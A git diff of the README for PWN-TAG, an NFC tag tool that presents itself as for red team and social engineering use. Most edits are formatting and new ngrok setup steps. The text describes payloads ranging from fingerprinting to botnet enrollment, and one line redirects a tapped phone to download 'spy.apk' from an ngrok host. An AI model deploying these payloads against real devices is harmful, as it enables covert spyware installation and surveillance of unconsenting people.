@@ -1,11 +1,11 @@
 # PWN-TAG  
 _"tag to pwn"_ — NFC payload delivery system for social engineering, red team ops, and mobile testing.
 
-PWN-TAG lets you write NFC tags that trigger live payloads on mobile devices — from fingerprinting to botnet enrollment. Built for hackers, educators, defenders, and curious minds.
+PWN-TAG lets you write NFC tags that trigger live payloads on mobile devices — from fingerprinting to botnet enrollment. Built for ethical hackers, educators, defenders, and curious minds.
 
 ---
 
-##  Branches
+## Branches
 
 | Branch         | Purpose                                                                 |
 |----------------|-------------------------------------------------------------------------|
@@ -28,27 +28,46 @@ git checkout ngrok-pro
 *  NFC writer app (free):
   [https://apps.apple.com/app/id1252962749](https://apps.apple.com/app/id1252962749)
 
-*  A Debian-based Linux system
+*  A Debian-based Linux system 
 
-* A [ngrok](https://ngrok.com/) account (free or paid)
+*  A [ngrok](https://ngrok.com/) account (free or paid)
 
 ---
 
 ##  Installation (Clone + Setup)
 
 ```bash
-# Clone the repo
 git clone https://github.com/ekomsSavior/PWN-TAG.git
 cd PWN-TAG
+```
 
 # (Optional) Switch to pro version for static subdomain support
-git checkout ngrok-pro
 
+```bash
+git checkout ngrok-pro
+```
 # Install Python dependencies
+
+```bash
 sudo apt update
 sudo apt install python3 python3-pip -y
 pip3 install flask
 ```
+
+## ngrok Setup
+
+```bash
+wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
+tar -xvzf ngrok-v3-stable-linux-amd64.tgz
+sudo mv ngrok /usr/local/bin/
+```
+
+Then authenticate your token: [https://ngrok.com/](https://ngrok.com/)
+
+```bash
+ngrok config add-authtoken <YOUR_NGROK_AUTH_TOKEN>
+```
+
 
 ---
 
@@ -98,7 +117,7 @@ Logs any device fingerprinting or interaction data sent by payloads.
 
 ---
 
-##  Write Your NFC Tag
+## Write Your NFC Tag
 
 Using your NFC writer app:
 
@@ -158,8 +177,6 @@ window.location.href = "https://pwn-tag.ngrok.app/payloads/spy.apk";
 
 ##  Ethical Usage
 
-This tool is intended for **educational purposes, red team ops, and ethical testing only**.
+This tool is intended for **educational purposes, red-team ops, and ethical testing only**.
 You are responsible for your actions. Do not use this on devices or individuals without consent.
-
-
 
